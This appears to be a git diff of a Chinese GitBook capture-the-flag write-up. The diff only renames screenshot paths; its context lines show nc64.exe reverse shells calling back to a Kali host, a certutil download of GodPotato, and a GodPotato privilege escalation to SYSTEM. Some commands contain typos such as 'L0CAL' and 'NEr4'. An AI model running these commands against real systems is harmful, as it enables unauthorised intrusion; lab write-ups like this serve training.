@@ -78,19 +78,19 @@ hydra -L /usr/share/secLists/Usernames/Names/names.txt -P /usr/share/SecLists/Pa
 
 * nc64.exe程序上传成功：
 
-<figure><img src="../.gitbook/assets/17 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/17 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/18 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/18 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### GET SHELL
 
 * 此时，可再次修改脚本内容，用于执行反弹shell回连到Kali机器上：
 
-<figure><img src="../.gitbook/assets/19 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/19 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 但是返回后的信息显示了一个错误信息，我设置的命令被嵌套在好几个函数中：
 
-<figure><img src="../.gitbook/assets/20 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/20 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 使用反斜杠逃逸：
 
@@ -98,13 +98,13 @@ hydra -L /usr/share/secLists/Usernames/Names/names.txt -P /usr/share/SecLists/Pa
 .\\\\nc64.exe 192.168.45.158 4444 -e cmd.exe
 ```
 
-<figure><img src="../.gitbook/assets/21 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/21 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 监听端口接收到了回连的shell，此时getshell并获得了flag：
 
-<figure><img src="../.gitbook/assets/22 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/22 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/23 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/23 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## 权限提升
 
@@ -112,9 +112,9 @@ hydra -L /usr/share/secLists/Usernames/Names/names.txt -P /usr/share/SecLists/Pa
 
 * 先手工进行简单的信息收集：
 
-<figure><img src="../.gitbook/assets/24 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/24 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/25 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/25 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### 漏洞利用
 
@@ -128,17 +128,17 @@ reg query "HKEY_L0CAL_MACHINE\S0FTWARE\Microsoft\NET Framework Setup\NDP"
 
 * 下载GodPotato-NET4.exe，然后将工具传到目标系统中：
 
-<figure><img src="../.gitbook/assets/27 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/27 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```powershell
 certutil -split -f -urlcache http://192.168.45.158/GodPotato-NET4.exe
 ```
 
-<figure><img src="../.gitbook/assets/28 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/28 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 上传成功后，执行一下GodPotato-NET4.exe程序，看看是否可以成功执行：
 
-<figure><img src="../.gitbook/assets/29 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/29 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### ROOT
 
@@ -148,11 +148,11 @@ certutil -split -f -urlcache http://192.168.45.158/GodPotato-NET4.exe
 .\GodPotato-NEr4.exe -cmd "C:\Users\nathan\Nexus\nexus-3.21.0-05\nc64.exe 192.168.45.158 8888 -e cmd.exe"
 ```
 
-<figure><img src="../.gitbook/assets/30 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/30 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 获得ROOT flag：
 
-<figure><img src="../.gitbook/assets/31 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/31 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 本例算中等偏难的机器，锁定可利用的漏洞和提权时都不难，但是其实现过程中需要根据实际情况进行修改和变通。
